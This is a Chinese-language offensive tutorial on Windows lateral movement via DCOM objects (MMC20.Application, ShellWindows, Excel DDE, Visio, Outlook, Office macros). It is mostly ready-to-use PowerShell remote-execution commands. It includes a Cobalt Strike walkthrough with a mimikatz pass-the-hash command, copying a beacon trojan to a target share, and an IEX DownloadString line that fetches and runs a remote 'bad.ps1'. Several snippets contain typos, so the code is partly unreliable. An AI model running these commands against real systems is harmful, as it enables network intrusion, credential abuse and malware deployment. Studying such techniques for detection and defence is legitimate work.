@@ -1,0 +1,597 @@
+## 前言
+
+DCOM是[COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx)（组件对象模型）的扩展，它允许应用程序实例化和访问远程计算机上COM对象的属性和方法，就像使用基于DCERPC的DCOM协议在本地计算机上的对象一样。有关每个COM（和DCOM）对象的标识，实现和配置的信息存储在注册表中，并与一些重要的标识符相关联：
+
+CLSID
+
+    
+    
+    -所述类标识符是一个GUID，它充当一个COM类的唯一标识符，并且每一个在Windows注册类与CLSID相关联（COM对象可以在没有登记使用，但是这超出了本文的范围） 。注册表中的CLSID密钥指向类的实现，如果是基于dll的对象，则使用InProcServer32子项；如果是exe ，则使用LocalServer32项。
+
+ProgID
+
+    
+    
+    -该编程标识符是一个可选的标识符，其可被用作对用户更友好的替代一个CLSID，因为它不必坚持的CLSID的恐吓GUID格式（“System.AppDomainManager”，例如，是比GUID容易得多）。ProgID不能保证是唯一的，并且与CLSID不同，并非每个类都与ProgID相关联。
+    
+    
+    -该应用程序标识符用于指定一个的配置或多个COM对象与同一可执行相关联。这包括授予各个组的权限，以在本地和远程实例化和访问关联的类
+
+为了使DCOM可访问COM对象，必须将AppID与该类的CLSID关联，并且需要为该AppID提供适当的权限。没有关联的AppID的COM对象不能从远程计算机直接访问。
+
+ **在powershell中我们可以使用**
+
+    
+    
+    get-CimInstance来列出本地COM程序列表
+
+![](https://image.3001.net/images/20201201/1606813924_5fc608e4eb9c03bfdbcc0.png!small)![](https://image.3001.net/images/20201201/1606816351_5fc6125f6ec9d808a1268.png!small)也可以使用OleView
+.NET了来列出
+
+![](https://image.3001.net/images/20201201/1606813970_5fc60912db7eed9971ca9.png!small)远程DCOM对象的实例表现如下：
+
+    
+    
+    客户端计算机从远程计算机请求实例化由CLSID表示的对象。如果客户端使用ProgID，则首先将其本地解析为CLSID。
+    远程计算机检查是否存在与所讨论的CLSID关联的AppID，并验证客户端的权限。
+    如果一切顺利，则DCOMLaunch服务将创建所请求类的实例，通常是通过运行LocalServer32子项的可执行文件，或者通过创建DllHost进程来承载InProcServer32子项引用的dll。
+    在客户端应用程序和服务器进程之间建立通信。在大多数情况下，新过程是在与DCOM通信关联的会话中创建的。
+    然后，客户端可以访问新创建的对象的成员和方法。
+
+所以我们给出的思路就是找到一些默认权限（DefaultLaunchPermission）的COM程序来进行利用
+
+##  **可以利用的DCOM**
+
+这里说的是公开的。
+
+###  **1.EXCEL DDE**
+
+首先创建“ ”对象的实例，这里我们使用ProgID
+
+    
+    
+    $a = [activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","10.10.10.10"))
+
+![](https://image.3001.net/images/20201201/1606814099_5fc60993ab923e7993931.jpg!small)
+
+    
+    
+    使用DDEInitate（“cmd.exe”,"/c calc,exe"）
+
+![](https://image.3001.net/images/20201201/1606814120_5fc609a8de329c9ec43de.jpg!small)
+
+但是目标主机会有一个提示。所以我们需要关闭它
+
+![](https://image.3001.net/images/20201201/1606814162_5fc609d25515a8f4d543f.png!small)最后的利用手法是：
+
+    
+    
+    $a = [activator]::CreateInstance([type]::GetTypeFromprogID("Excel.Application","10.10.10.10"))
+    $a.DisplayAlerts = $false  //DisplayAlerts属性控制DDEInitiate提出的警报。 false为关
+    $a.DDEInitiate("cmd","/c calc,exe")
+
+![](https://image.3001.net/images/20201201/1606814192_5fc609f0b63f2536f6f79.png!small)
+
+Excel进程运行我们的命令，并尝试与所述应用程序建立DDE通道。失败时返回错误代码，但命令仍在运行。
+
+###  **2.** **MMC20.APPLICATION**
+
+创建“ MMC20.Application ”对象的实例并利用：
+
+    
+    
+    [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application" ,"10.10.10.10")).Document.ActiveView.Executeshellcommand('cmd.exe',$null,"/c calc.exe","Restored")
+
+![](https://image.3001.net/images/20201201/1606814260_5fc60a3409999c905751f.jpg!small)
+
+###  **3.** **SHELLWINDOWS**
+
+创建ShellWindows对象的实例：
+
+    
+    
+    $a =  [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.10")) | Get-member
+
+使用“ Document.Application”属性的“ ShellExecute”方法运行任意命令：
+
+    
+    
+    $a =  [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.10")).Document.Application.ShellExecute("cmd.exe","/c clac.exe"."c:\windows32\system",$null,0)
+
+![](https://image.3001.net/images/20201201/1606814326_5fc60a761d211a4802a0f.png!small)
+
+说明：
+
+与大多数其他方法不同，ShellWindows不会创建进程。相反，它会激活现有explorer.exe进程内部的类实例，该进程执行子进程。为了进行通信，主机explorer.exe在DCOM端口上打开了一个侦听套接字，该套接字应明确标记此技术。
+
+###  **4.SHELLBROWSERWINDOW**
+
+首先创建ShellBrowserWindow对象的实例：
+
+![](https://image.3001.net/images/20201201/1606814380_5fc60aac49b426e8ca8a8.png!small)
+
+复制GUID
+
+    
+    
+    $a =  [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.10.10.10")) 
+
+![](https://image.3001.net/images/20201201/1606814428_5fc60adcce9d335b0a5f0.jpg!small)我们再次能够通过“
+Document.Application”属性的“ ShellExecute”方法运行命令
+
+    
+    
+    $a =  [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.10.10.10")).Document.Application.shellExecute("calc.exe")
+
+![](https://image.3001.net/images/20201201/1606814461_5fc60afd609585ebe91c7.jpg!small)
+
+与ShellWindows一样，此方法由现有的explorer.exe进程托管，再次具有带有监听套接字的explorer.exe进程的指示器。
+
+###  **5.VISIO ADDON EXECUTION**
+
+虽然不是默认Office安装的一部分，因此没有普及，但Visio提供了可用于横向移动的DCOM对象。
+
+创建Visio对象的实例。这可以通过Visio.Application ProgID或通过Visio.InvisibleApp ProgID完成：
+
+这里使用的是ProgID
+
+    
+    
+    $a =  [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","10.10.10.10")) 
+
+![](https://image.3001.net/images/20201201/1606814520_5fc60b38aa970e1af6fae.jpg!small)
+
+Visio插件可以实现为独立进程，并且Visio允许将任何可执行文件作为自定义插件加载。这可以用来执行命令：
+
+    
+    
+    $a =  [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.Application","10.10.10.10")).[0].document.app;ication.shellExecute("calc")
+
+注意：
+
+目标主机中安装有Visio才能成功利用。
+
+###  **6.** **Outlook**
+
+在Outlook对象允许实例化和任意COM相互作用通过“创建对象”对象方法。这使攻击者可以与远程计算机上的COM对象进行交互，这些对象通常不会由DCOM公开。
+
+创建Outlook对象的实例
+
+    
+    
+    $a =  [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.APPLICATION","10.10.10.10")) 
+
+可以通过通过Outlook创建[Shell.Application](https://msdn.microsoft.com/en-us/library/windows/desktop/bb774063\(v=vs.85\).aspx)对象来实现命令行执行：
+
+    
+    
+    $a =  [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.APPLICATION","10.10.10.10")) .createObject("Shell.Application")
+    $a.shellExecute(calc.exe)
+
+该命令作为Outlook的直接子进程运行。
+
+ **注意** -可以将“ Shell.Application”（已加载的shell32.dll中实现）对象替换为“ Wscript.Shell”.
+
+###  **7.** **Excel XLL （** **Excel进程加载恶意的DLL）**
+
+XLL库可以扩展Excel，XLL库只是导出特定功能的DLL。Excel.Application对象通过RegisterXLL方法利用此功能。
+
+    
+    
+    $a =  [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.APPLICATION","10.10.10.10")) .RegisterXLL("我们的恶意DLL路径")
+
+###  **8.任意脚本执行**
+
+通过CreateObject和ScriptControl执行OutlookScript
+
+使用Outlook访问ScriptControl COM类，我们可以利用该字符串运行以字符串格式提供的脚本：
+
+    
+    
+    $a = [activator]::CreateInstance([type]::GetTypeFromProgID("Outlook.APPLICATION","10.10.10.10")) .CreateObject("b")
+    $b.language = "VBScript"
+    $b.AddCode('CreateObject("Wcript.Shell").Exec("Calc.exe")')
+
+ScriptControl对象是在msscript.ocx中实现的，很少使用，并且合法地加载此对象的Outlook实例是极为罕见的现象。此外，我们可以将加载jscript.dll或vbscript.dll来运行脚本本身。
+
+ **限制**
+-ScriptControl对象仅在32位版本中可用。由于64位进程无法加载32位inproc对象，因此64位Outlook无法与该对象进行交互。
+
+Visio对象提供了一种直接方法，可以使用“ ExecuteLine”方法从字符串运行VBA的任何代码：
+
+    
+    
+    $a = [activator]::CreateInstance([type]::GetTypeFromProgID("a.invisibleapp","10.10.10.10"))
+    $b = $a.documents.Add("")
+    $b.Executeline('CreateObject("wscript.Shell").exec("calc.exe")')
+
+VBE7.dll和ScrRun.dll已加载到Visio进程中
+
+ **注意** -ExecuteLine方法仅允许执行一行代码。通过使用冒号（:)符号将语句分隔在一行上，可以绕过此操作。
+
+###  **9.OFFICE无文件宏执行**
+
+Office中的VBA引擎模型通常是无法通过编程实现的，需要通过每个应用程序的属性菜单中的“对Visual Basic项目的信任访问”选项来启用。
+
+也可以通过注册表中每个相关Office应用程序 HKCU\Software\Microsoft\Office\<office
+version>\<office application
+name>\Security\accessVBOM的值来完成此操作。将这些值远程设置为1（例如，通过WMI）可以将VBA宏注入并执行到Excel，Word，PowerPoint和Access中，而无需首先提供带有文档文件的有效负载。
+
+  
+
+我们使用的宏来运行calc.exe：
+
+下面是我们的宏代码
+
+    
+    
+    $a = 'Sub Execute()'
+    CreateObject("Wscript.Shell").Exec("calc.exe")
+    End Sub
+    
+    
+    Sub AutoOpen()
+    Excute
+    end Sub'
+
+ **通过Excel执行：**
+
+    
+    
+    $b = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.application"))
+    $c = $b.Workbooks.Add("")
+    $c.VBProject.VBComponents(1).codeModule.ADDFromString($a) //注意：这里加载我们上面的宏代码
+    $b.run("Book1!ThisWorkbook.Execute")
+    $b.Quit()
+
+ **通过Word执行：**
+
+    
+    
+    $b = [activator]::CreateInstance([type]::GetTypeFromProgID("word.application"))
+    $c = $b.Documents.Add("")
+    $c.VBProject.VBComponents(1).codeModule.ADDFromString($a) //注意：这里加载我们上面的宏代码
+    $c.runAutoMacro(2)
+    $b.Quit()
+
+ **通过PowerPoint执行：**
+
+    
+    
+    $ppt = [activator]::CreateInstance([type]::GetTypeFromProgID("Powerpoint.Applicatiion"))
+    $pres = $ppt.Presentations.add(1)
+    $vbs = $pres.VBProject.VbComponents.add(1)
+    $vbs.CodeModule.AddFromString($a)
+    $ppt.Run("Execute")
+    $ppt.Quit()
+
+ **通过Access执行：**
+
+    
+    
+    $access = [activator]::CreateInstance([type]::GetTypeFromProgID("access.Application"))
+    $db = $access.NewCurrentDatbase("Fake_name")
+    $vbc = access.vbe,V8projects(1).VBSComponents.Add(1)
+    $vbc.CodeModule.AddFromString($a)
+    $access.Run("Execute")
+    $access.Quit()
+
+启用这些方法需要对某些注册表项进行操作，而这些注册表项很少会被远程调用，并且偶尔会被恶意宏使用。
+
+这里还要应用程序加载Visual Basic环境（vbe7.dll）库。此外，由于需要保存文档，因此任何应用程序创建新文档都会使“
+Quit”方法失败。这意味着潜在的有效负载需要以某种方式处理，以不显眼的方式取消父Office进程，从而避免使启用进程在执行后仍在环境中徘徊。与其他应用程序不同，访问留下了一个额外的工件，它需要实际创建一个数据库文件并将其保存到攻击者在磁盘上选择的位置，然后才能插入并执行宏。
+
+注意：在64位版本的Windows上安装32位Office不会为相关应用程序注册appID
+
+## 横向移动--使用MMC20.APPLICATION COM对象复现
+
+### 基础知识
+
+ **使用PowerShell进行通信**
+
+注意：这里我使用的是powershell，根据微软的说法，我们可以使用任何语言来与COM进行通信。
+
+    
+    
+    PowerShell构建与.NET Framework之上，而框架已经提供了对COM的近乎完美的支持。
+    如可以用.NET的机制获取封装COM对象的.NET的类型，用Activator类创建这个类的实例。
+
+根据上述的知识我们就可以构造出使用Powershell跟COM通信的语句了：
+
+例如跟MMC20.APPlication通信
+
+    
+    
+    PS C:\Windows\system32> $a = [type]::GetTypeFromProgID("MMC20.application")   // 从GetTypeFromProgID()方法取回的类型的别名称之为“-ComObject”
+    PS C:\Windows\system32> $a     //可以看到读取回来了 //所有的COM对象都是被封装为这个类型
+
+![](https://image.3001.net/images/20201201/1606815175_5fc60dc7a6983f9107fe3.png!small)
+
+    
+    
+    PS C:\Windows\system32> $b = [activator]::createInstance($a)   //通过Activator类的CreateInstance()方法来实例化一个对像 Activator对象用来创建.NET对象
+    PS C:\Windows\system32> $b 
+
+![](https://image.3001.net/images/20201201/1606815155_5fc60db302da4e23c60e8.png!small)
+
+  
+
+最后我们通过powershell的get-member方法来读取详细的值
+
+    
+    
+    PS C:\Windows\system32> $b | get-Member //get-Member cmdlet获取对象的成员，属性和方法 
+
+![](https://image.3001.net/images/20201201/1606815077_5fc60d65b789931cbd215.png!small)**获取DCOM程序列表**
+
+在powershell中我们可以使用来获取本地的DCOM程序列表
+
+    
+    
+    Get-cimInstance win32_Dcomapplication
+
+![](https://image.3001.net/images/20201201/1606815125_5fc60d952bfa4fdae1bb1.png!small)
+
+注意在windows7，windows server 2008中默认安装powershell的版本是powershell 2.0
+
+powershell 2.0 不支持Get-CimInstance，所以如果在powershell 2.0 中的话，我们可以所以如下命令代替Get-cimInstance 列出本地的DCOM程序列表
+
+    
+    
+    Get-WmiObject  -nameSpace root\cimv2 -class win32_dcomapplication
+
+![](https://image.3001.net/images/20201201/1606815231_5fc60dff9a0963267c6e9.png!small)![](https://image.3001.net/images/20201201/1606815276_5fc60e2c1bfd3eb92c326.png!small)
+
+当然我们也可以远程列出目标本地的DCOM程序列表
+
+  
+
+在Cobat Strike中 进入一个beacon
+
+    
+    
+    beacon>shell powershell.exe Get-WmiObject  -nameSpace root\cimv2 -class win32_dcomapplication 
+        //目标机器是Windows7 也就是powershell2.0 所以我们使用 Get-WmiObject  -nameSpace root\cimv2 -class
+
+![](https://image.3001.net/images/20201201/1606815314_5fc60e52b2e73e66d802e.png!small)同理在MSF等等shell
+C2中也可以.这里不多描述。
+
+###  **使用MMC20.APPLICATION COM对象**
+
+我们来看看什么是MMC20.APPLICATION
+
+从微软的文档中我们可以知道
+
+    
+    
+    https://docs.microsoft.com/en-us/previous-versions/system-center/configuration-manager-2003/cc181199(v=technet.10)?redirectedfrom=MSDN
+    
+    
+    Microsoft管理控制台（MMC）2.0包括脚本对象模型。
+    该对象模型可用于控制大多数SMS Administrator控制台功能。
+    通过使用WSH SendKeys对象（可以模拟键盘输入），可以控制MMC 2.0脚本对象模型无法控制的任何功能。
+    如果可以通过键盘控制该功能，则SendKeys可以对其进行控制。SendKeys可用于控制大多数SMS Administrator控制台，但是MMC 2.0脚本对象模型通常更可靠。
+    如果由于任何原因导致Windows焦点从SMS管理员控制台转移，则可以将SendKeys定向到错误的应用程序。
+
+简单来说就是牛逼，MMC20.APPLICATION不是重点
+
+在Document.ActiveView下有一个名为“ ExecuteShellCommand”的方法才是我们要关注的对象
+
+利用攻击不是我们的目标，学习如何发现该利用手法才是我们的目标。
+
+  
+
+1.我们列出在MMC20.APPLICATION中的模块
+
+    
+    
+    PS C:\Windows\system32> [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application")) | Get-member 
+       //根据前面“任何使用PowerShell进行通信” 我们可以构造这样的语句
+
+  
+
+2.继续列出Document中的属性
+
+    
+    
+    [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application")).Document | Get-member
+
+![](https://image.3001.net/images/20201201/1606815484_5fc60efca0f4b30e31424.png!small)
+
+3.继续列出Document.ArtiveView中的属性
+
+    
+    
+    [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application")).Document.ActiveView | Get-member
+
+![](https://image.3001.net/images/20201201/1606815520_5fc60f207208bcd89c973.png!small)
+
+可以看到我们的利用点了
+
+    
+    
+    ExecuteShellCommand           Method                void ExecuteShellCommand (string, string, string, string)
+
+从方法中我们也能知道可以执行shell命令了。
+
+那么我们可以去微软的文档看看，该ExecuteShellCommand调用的方法
+
+![](https://image.3001.net/images/20201201/1606815615_5fc60f7f0ad8cfac5ef52.png!small)
+
+    
+    
+    参量
+    
+    命令
+    一个值，指定要执行的命令。可以指定标准路径。Command中包含的所有环境变量（例如“％windir％”）都将被扩展。
+    
+    目录
+    一个值，用于指定工作目录的名称。Directory中包含的所有环境变量都将被扩展。如果“目录”为空字符串，则将当前目录用作工作目录。
+    
+    参量
+    一个指定Command要使用的参数（如果有）的值；参数必须用空格分隔。例如，将参数指定为“ Param1 Param2”会导致Command接收Param1和Param2作为参数。如果要求单个参数用双引号引起来，请使用适合您的编程语言的技术。例如，在Microsoft Visual Basic中，将参数指定为“ Param1”“这是Param2”“”导致命令接收到参数1和“这是Param2”。
+    
+    窗口状态
+    一个指定窗口状态的值。该值可以是以下字符串值之一，也可以是空字符串。如果为空字符串，则默认为“已恢复”。
+    
+    “Maximized”
+    该命令在最大化的窗口中执行。
+    
+    “Minimized”
+    该命令在最小化的窗口中执行。
+    
+    “Restored”
+    该命令在已恢复或正常的窗口中执行。注意：这里会弹个黑框框
+    
+    返回值
+    此方法不返回值。
+
+阅读微软文档我们知道该ExecuteShellCommand执行了命令是没有返回值的（也就是说没有回显）还有就是我们需要4个值（string）来调用该方法。
+
+那么我们可以构造为
+
+    
+    
+    ExecuteShellCommand（[命令][目录][叁数][窗口状态]）
+
+我们从本地弹个计算器看看吧
+
+    
+    
+    [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application")).Document.ActiveView.Executeshellcommand('cmd.exe',$null,"/c calc.exe","Restored") 
+
+![](https://image.3001.net/images/20201201/1606815767_5fc61017b2b713389fa2d.png!small)本地利用是没有问题的，但是我们需要的是横向移动，也就是说要在目标机器上远程执行命令。
+
+  
+
+### 2.0远程利用执行命令（横向移动）
+
+我们知道DCOM（分布式组件对象模型）具有通过网络与对象进行交互的能力。
+
+作为管理员，我们可以使用“
+`GetTypeFromProgID`()"与PowerShell进行DCOM远程交互。注意：远程执行命令需要与目标进行Kerberos
+v5身份验证，认证之后才能进行通信。
+
+通过阅读微软（https://docs.microsoft.com/en-us/previous-versions/ms741629(v=vs.85)）的文档，我们可以构造出：
+
+    
+    
+    GetTypeFromProgID("COM","远程ip")
+
+那么最后的语句就是
+
+    
+    
+    [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application" ，“远程ip”)).Document.ActiveView.Executeshellcommand('cmd.exe',$null,"/c calc.exe","Restored")
+        //在远程主机上利用MMC.app;ication执行弹出计算器
+
+这里我搭了个内网靶机
+
+    
+    
+    拿下的主机 ip:10.10.10.8(内网) 192.168.50.148(外网)
+    横向的目标主机ip:10.10.10.10
+
+命令：
+
+    
+    
+    [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application" ,"10.10.10.10")).Document.ActiveView.Executeshellcommand('cmd.exe',$null,"/c calc.exe","Restored")
+
+执行成功。看看10.10.10.10主机
+
+![](https://image.3001.net/images/20201201/1606815925_5fc610b59ee983ad1763c.png!small)计算器在运行了，表示执行成功
+
+  
+
+### 3.0实战手法
+
+我们可以使用这种技术在远程主机上执行一个木马，这里表示我们拿下了一台域内的administrator权限的主机。并且抓取到来域内一些主机的hash。
+
+需要满足：
+
+    
+    
+    administrator权限
+    具有信任公系
+
+例如[Cobalt Strike的Beacon](https://www.cobaltstrike.com/help-beacon)。由于这是横向移动技术，因此需要远程主机上的管理特权：
+
+我们可以使用远程无文件执行个ps1上线Cobat Strike。
+
+ **1.我们建立一个ipc$链接**
+
+这里我们使用mimikatz来进行hash传递来建立一个Kerberos v5身份验证的信任关系
+
+    
+    
+    beacon>mimikatz sekurlsa::pth /domian:10.10.10.10 /user:administrator /ntlm:161cff084477fe596a5db81874498a24
+
+![](https://image.3001.net/images/20201201/1606816043_5fc6112b5350703ec9d50.png!small)
+**2.查看是否建立起来了IPC$链接**
+
+    
+    
+    beacon>shell dir \\10.10.10.10\c$   //列出远程主机的目录 如果成功就表示IPC$链接了
+
+![](https://image.3001.net/images/20201201/1606816079_5fc6114f4d5d4c2c8e790.png!small)
+
+ **3.使用Cobat Strike生成给内网中转的木马**
+
+新建一个中转的的listener
+
+![](https://image.3001.net/images/20201201/1606816097_5fc61161f0eccced22d8b.png!small)生成木马
+
+![](https://image.3001.net/images/20201201/1606816120_5fc61178b69ca70f085a9.png!small)上传木马到我们拿下的主机中
+
+![](https://image.3001.net/images/20201201/1606816138_5fc6118a47fc6b66f0dc2.png!small)使用copy命令来通过IPS$把木马上传到横向的目标中（这里只简单演示，实战中看具体环境进行传输）
+
+    
+    
+    beacon> shell copy C:\Users\administrator.WEB\Desktop\beacon123.exe \\10.10.10.10\c$
+
+![](https://image.3001.net/images/20201201/1606816163_5fc611a3e2f5342eccc21.png!small)即可看到新的主机上线也就是说成功横向了
+
+![](https://image.3001.net/images/20201201/1606816176_5fc611b0b49f42acfead9.jpg!small)在使用IPC$传输文件时如果让拦截了我们可以使用powershell等等进行传输，或者使用MMC20.APPLICATION调用powershell直接远程加载PS1上线，
+
+    
+    
+    [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","10.10.10.10")).Document.ActiveView.Executeshellcommand('powershell.exe',$null,"IEX(New-Object Net.WebClinet).DownloadString('http://www.cn0sec.cn/bad.ps1')","Restored")
+
+## 作用
+
+我们知道有很多方法可以进行Windows系统的横向移动。
+
+其中一些技术包括psexec，WMI，At，计划任务和WinRM（如果已启用）。但是成熟的防御者和防火墙能够检测到使用并拦截。
+
+使用DCOM来进行横向使用的是[MS-RPCE]中指定的远程过程调用协议的，可以隐蔽地横向移动。
+
+![](https://image.3001.net/images/20201201/1606816231_5fc611e715bab673c7b3a.png!small)
+
+这里补一句，大家都看到了在执行命令后Cobalt
+Strike中上线的权限为administrator权限，那么为什么会这样？是因为微软在MMC20.APPLICATION中并没有默认设置LaunchPermission值，也就是说默认使用的是DefaultLaunchPermission值。
+
+在微软文档中我们可以看到：
+
+    
+    
+    此值提供了对默认启动访问的简单级别的集中管理，该默认启动访问是对计算机上其他未管理的类的访问。
+    例如，管理员可以使用DCOMCNFG工具将系统配置为允许超级用户进行只读访问。
+    因此，OLE会将启动类代码的请求限制为Power Users组的成员。管理员随后可以为单个类配置启动权限，以根据需要向其他组或单个用户授予启动类代码的能力
+    
+    默认访问权限如下：
+    
+    管理员：允许启动
+    系统：允许启动
+    互动：允许启动
+    
+    https://docs.microsoft.com/zh-cn/windows/win32/com/defaultlaunchpermission
+
+显而易见，在默认的DefaultLaunchPermission值中我们可以进行远程利用并是administrator权限执行。
+
+## 总结
+
+使用MMC20.APPLICATION COM对象来进行横向移动不是什么新手法了，我们需要学习的是手法的如何发现和利用原理，这样才能对我们有帮助。
+
+只有这样我们才可以学习并找到新的利用手法。
+
